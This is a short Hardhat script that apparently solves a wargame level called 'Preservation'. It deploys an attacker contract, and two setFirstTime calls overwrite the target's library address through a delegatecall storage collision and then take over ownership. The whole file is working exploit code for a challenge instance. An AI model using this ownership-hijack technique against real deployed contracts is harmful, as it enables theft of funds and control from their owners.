import { ethers } from "hardhat";

async function handleReal() {
  const YOUR_PRESERVATION_INSTANCE =
    "0x0E107a08472ED7B9fA45E1e5edE094740e4Cf1ad";

  // ONE RUN SOLVE
  const preservationDestroyerFactory = await ethers.getContractFactory(
    "PreservationDestroyer"
  );
  const preservationDestroyer = await preservationDestroyerFactory.deploy();
  await preservationDestroyer.waitForDeployment();
  const preservationDestroyerAddress = await preservationDestroyer.getAddress();
  console.log("destroyer address:", preservationDestroyerAddress);
  const preservation = await ethers.getContractAt(
    "Preservation",
    YOUR_PRESERVATION_INSTANCE
  );
  console.log("timeZone1 init:", await preservation.timeZone1Library());
  const inputAddress =
    "0x000000000000000000000000" + preservationDestroyerAddress.substring(2);
  const tx = await preservation.setFirstTime(inputAddress, {
    gasLimit: 100000,
  });
  await tx.wait();
  console.log("tx:", tx.hash);
  console.log("timeZone1 changed:", await preservation.timeZone1Library());
  const tx1 = await preservation.setFirstTime(inputAddress, {
    gasLimit: 100000,
  });
  await tx1.wait();
  console.log("tx1:", tx1.hash);
  console.log("New owner:", await preservation.owner());
}

// handleTest().catch((error) => {
handleReal().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
